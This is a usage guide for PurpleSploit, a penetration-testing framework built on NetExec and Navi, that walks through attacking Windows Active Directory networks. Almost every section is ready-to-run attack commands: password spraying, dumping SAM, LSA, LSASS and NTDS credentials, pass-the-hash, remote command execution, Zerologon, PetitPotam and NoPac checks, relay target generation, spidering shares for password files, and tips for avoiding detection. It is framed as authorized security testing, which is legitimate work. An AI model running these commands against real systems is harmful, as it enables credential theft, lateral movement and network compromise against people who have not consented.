# PurpleSploit Usage Guide

Comprehensive guide for using PurpleSploit effectively in penetration testing engagements.

## Table of Contents

1. [Getting Started](#getting-started)
2. [Workflow Guide](#workflow-guide)
3. [Common Scenarios](#common-scenarios)
4. [Advanced Techniques](#advanced-techniques)
5. [Tips & Tricks](#tips--tricks)
6. [Troubleshooting](#troubleshooting)

## Getting Started

### First Launch

After installation, start with the interactive framework:

```bash
./plat02.sh
```

You'll see the main menu with options for:
- Credential management
- Target management
- Testing actions
- Configuration

### Initial Setup

1. **Add your first credential set:**
   ```
   Main Menu > Credential Management > Add New Credential

   Name: DomainUser
   Username: jdoe
   Password: Password123
   Domain: CORP.LOCAL
   ```

2. **Add your first target:**
   ```
   Main Menu > Target Management > Add Network Target

   Name: DC01
   Target: 192.168.1.10
   ```

3. **Test connectivity:**
   ```
   Main Menu > Quick Actions > Test Authentication
   ```

## Workflow Guide

### External Penetration Test Workflow

#### Phase 1: Discovery
```bash
# Scan for SMB services
nxc smb 192.168.1.0/24

# Check for null sessions
nxc smb 192.168.1.0/24 -u '' -p ''

# Anonymous LDAP
nxc ldap 192.168.1.10 -u '' -p ''
```

#### Phase 2: Enumeration
```bash
# Once credentials obtained
nxc smb 192.168.1.10 -u user -p pass --shares
nxc smb 192.168.1.10 -u user -p pass --users
nxc smb 192.168.1.10 -u user -p pass --groups
nxc smb 192.168.1.10 -u user -p pass --pass-pol
```

#### Phase 3: Exploitation
```bash
# Check for vulnerabilities
nxc smb 192.168.1.0/24 -M ms17-010
nxc smb 192.168.1.10 -u user -p pass -M zerologon

# Credential dumping
nxc smb 192.168.1.10 -u admin -p pass --sam
nxc smb 192.168.1.10 -u admin -p pass --lsa
```

#### Phase 4: Post-Exploitation
```bash
# Domain controller dumps
nxc smb 192.168.1.10 -u admin -p pass --ntds

# BloodHound collection
nxc ldap 192.168.1.10 -u user -p pass -d CORP -M bloodhound -o COLLECTION=All

# Search for sensitive files
nxc smb 192.168.1.10 -u user -p pass -M spider_plus -o PATTERN="password|credential|*.kdbx"
```

### Internal Assessment Workflow

#### Phase 1: Foothold Validation
```bash
# Verify access
nxc smb <target> -u <user> -p <pass>
nxc winrm <target> -u <user> -p <pass>
nxc ldap <target> -u <user> -p <pass> -d <domain>
```

#### Phase 2: Domain Reconnaissance
```bash
# Map domain structure
nxc ldap <dc> -u <user> -p <pass> -d <domain> --users --groups

# Find domain controllers
nxc smb <subnet> -u <user> -p <pass> -M get-network

# Enumerate trusts
nxc ldap <dc> -u <user> -p <pass> -d <domain> -M enum_trusts
```

#### Phase 3: Privilege Escalation Paths
```bash
# BloodHound for attack paths
nxc ldap <dc> -u <user> -p <pass> -d <domain> -M bloodhound -o COLLECTION=All

# Check for ADCS
nxc ldap <dc> -u <user> -p <pass> -d <domain> -M adcs

# Find admin sessions
nxc smb <subnet> -u <user> -p <pass> --sessions
```

#### Phase 4: Lateral Movement
```bash
# Find admin access
nxc smb <subnet> -u <user> -p <pass> -x whoami

# Pass-the-hash
nxc smb <subnet> -u <user> -H <hash>

# Execute on multiple targets
nxc smb <targets_file> -u <user> -p <pass> -x <command>
```

## Common Scenarios

### Scenario 1: Password Spraying

**Objective:** Test common passwords across user accounts

**Using Framework:**
```bash
./plat02.sh

# Create credential sets for each password
Add Credential: Spring2024
Add Credential: Summer2024
Add Credential: Welcome123

# Add target subnet
Add Target: Corporate_Network (192.168.1.0/24)

# Run authentication tests
Quick Actions > Test Authentication > All Credentials
```

**Using Navi:**
```bash
navi
> Search: "password spray"
> or use: nxc smb <subnet> -u users.txt -p 'Spring2024' --no-bruteforce --continue-on-success
```

**Direct Command:**
```bash
nxc smb 192.168.1.0/24 -u users.txt -p 'Spring2024' --no-bruteforce --continue-on-success
```

### Scenario 2: Credential Dumping from Compromised Host

**Objective:** Extract all credentials from a compromised system

**Step 1: Verify Admin Access**
```bash
nxc smb 192.168.1.50 -u admin -p pass -x "whoami /all"
```

**Step 2: Dump Local Credentials**
```bash
nxc smb 192.168.1.50 -u admin -p pass --sam --lsa
```

**Step 3: Extract from Memory**
```bash
nxc smb 192.168.1.50 -u admin -p pass -M lsassy
```

**Step 4: If Domain Controller**
```bash
nxc smb 192.168.1.50 -u admin -p pass --ntds
```

### Scenario 3: Finding Sensitive Files

**Objective:** Locate sensitive documents across file shares

**Using Framework:**
```bash
./plat02.sh

# Add target subnet
Target Management > Add Network Target > FileServers (192.168.1.0/24)

# Run spider module
Advanced > Custom NXC Command
> nxc smb 192.168.1.0/24 -u user -p pass -M spider_plus -o PATTERN="*.xlsx|*.docx|password|credential"
```

**Using Navi:**
```bash
navi
> Search: "spider"
> Select: Spider with pattern matching
> Pattern: "*.xlsx|*.docx|*.kdbx|password"
```

### Scenario 4: Active Directory Assessment

**Objective:** Complete AD security assessment

**Step 1: Initial Enumeration**
```bash
# Find domain controllers
nxc smb 192.168.1.0/24 -u user -p pass -M get-network

# Get domain info
nxc ldap <dc_ip> -u user -p pass -d CORP --users --groups --pass-pol
```

**Step 2: User Enumeration**
```bash
# List all users
nxc ldap <dc_ip> -u user -p pass -d CORP --users

# Find users with descriptions (often contain passwords)
nxc ldap <dc_ip> -u user -p pass -d CORP -M get-desc-users
```

**Step 3: Find Privilege Escalation Paths**
```bash
# Collect BloodHound data
nxc ldap <dc_ip> -u user -p pass -d CORP -M bloodhound -o COLLECTION=All

# Check for ADCS vulnerabilities
nxc ldap <dc_ip> -u user -p pass -d CORP -M adcs
```

**Step 4: Check for Known Vulnerabilities**
```bash
# Zerologon
nxc smb <dc_ip> -u user -p pass -M zerologon

# PetitPotam
nxc smb <dc_ip> -u user -p pass -M petitpotam

# NoPac
nxc smb <dc_ip> -u user -p pass -M nopac
```

### Scenario 5: Lateral Movement

**Objective:** Move from initial foothold to domain admin

**Step 1: Map Network**
```bash
# Find all accessible hosts
nxc smb 192.168.1.0/24 -u user -p pass

# Check WinRM access
nxc winrm 192.168.1.0/24 -u user -p pass
```

**Step 2: Find Admin Sessions**
```bash
# List logged on users
nxc smb 192.168.1.0/24 -u user -p pass --loggedon-users

# List active sessions
nxc smb 192.168.1.0/24 -u user -p pass --sessions
```

**Step 3: Targeted Credential Dumping**
```bash
# Dump from high-value targets
nxc smb <target> -u user -p pass -M lsassy
```

**Step 4: Pass-the-Hash**
```bash
# Use extracted hash
nxc smb 192.168.1.0/24 -u admin -H <ntlm_hash>
```

## Advanced Techniques

### Kerberos Authentication

```bash
# Use Kerberos
nxc smb <target> -u <user> -p <pass> -d <domain> --kerberos

# Use AES key
nxc smb <target> -u <user> --aesKey <aes_key> --kerberos
```

### SMB Relay Preparation

```bash
# Generate relay target list (hosts without SMB signing)
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Verify no SMB signing
nxc smb 192.168.1.0/24 -u '' -p ''
```

### Custom Module Usage

```bash
# List available modules
nxc smb -L

# Get module info
nxc smb -M lsassy --module-info

# Use module with options
nxc smb <target> -u <user> -p <pass> -M lsassy -o METHOD=1
```

### Database Operations

```bash
# View credential database
cat ~/.pentest-credentials.db

# View targets database
cat ~/.pentest-targets.db

# Backup databases
tar -czf pentest-backup.tar.gz ~/.pentest-*.db

# Restore databases
tar -xzf pentest-backup.tar.gz -C ~/
```

## Tips & Tricks

### Navi Power User Tips

1. **Use tags for filtering:**
   ```bash
   navi --tag-rules nxc,smb,enumeration
   ```

2. **Preview before executing:**
   ```bash
   navi --print  # Shows command without running
   ```

3. **Best match for quick execution:**
   ```bash
   navi --query "smb shares" --best-match
   ```

4. **Custom keybindings:**
   Edit `~/.config/navi/config.yaml` to customize

### Framework Efficiency

1. **Use descriptive names:**
   - Credentials: "DomainAdmin_CORP" not "cred1"
   - Targets: "DC01_Primary" not "target1"

2. **Leverage session persistence:**
   - Framework remembers last used credentials
   - Variables persist between Navi commands

3. **Batch operations:**
   - Create target lists in files
   - Use `nxc smb targets.txt -u user -p pass`

4. **Output management:**
   ```bash
   # Create output directory
   mkdir pentest-output
   cd pentest-output

   # Run commands with output
   nxc smb <target> -u <user> -p <pass> --users > users.txt
   nxc smb <target> -u <user> -p <pass> --groups > groups.txt
   nxc smb <target> -u <user> -p <pass> --shares > shares.txt
   ```

### Avoiding Detection

1. **Throttle requests:**
   ```bash
   for ip in $(cat targets.txt); do
     nxc smb $ip -u user -p pass
     sleep 5
   done
   ```

2. **Avoid noisy modules:**
   - Be cautious with spider_plus on large shares
   - Limit concurrent connections

3. **Use specific commands:**
   - Target specific information needed
   - Avoid unnecessary enumeration

## Troubleshooting

### Common Issues

**"Connection refused" errors:**
```bash
# Check if port is open
nmap -p 445 <target>

# Try different protocol
nxc winrm <target> -u <user> -p <pass>
```

**"Authentication failed" but credentials are correct:**
```bash
# Try with domain
nxc smb <target> -u <user> -p <pass> -d <domain>

# Try local auth
nxc smb <target> -u <user> -p <pass> --local-auth

# Try different protocol
nxc winrm <target> -u <user> -p <pass>
```

**"STATUS_ACCESS_DENIED" errors:**
```bash
# User may lack permissions
# Try different operation
# Check account restrictions
```

**Navi shows no results:**
```bash
# Reload cheatsheet
navi repo browse

# Check file exists
ls ~/.config/navi/cheats/nxc.cheat

# Verify format
head -20 ~/.config/navi/cheats/nxc.cheat
```

### Performance Issues

**Slow scanning:**
```bash
# Reduce subnet size
# Use specific targets
# Increase timeout with -t option
```

**High memory usage:**
```bash
# Process targets in batches
# Limit concurrent operations
# Use output files instead of keeping in memory
```

## Best Practices Checklist

- [ ] Verify authorization before testing
- [ ] Document all activities
- [ ] Use descriptive names for targets/credentials
- [ ] Save output to organized directory structure
- [ ] Clear sensitive data after engagement
- [ ] Follow agreed-upon scope
- [ ] Respect testing windows
- [ ] Communicate findings promptly
- [ ] Secure credential databases
- [ ] Back up important data before testing

## Next Steps

- Review [README.md](README.md) for installation and setup
- Check [QUICKSTART.txt](QUICKSTART.txt) for Navi shortcuts
- Explore [nxc-fixed.cheat](nxc-fixed.cheat) for all available commands
- Read [CONTRIBUTING.md](CONTRIBUTING.md) to contribute

---

**Remember:** Always ensure you have proper authorization before testing any systems. This tool is for authorized security testing only.
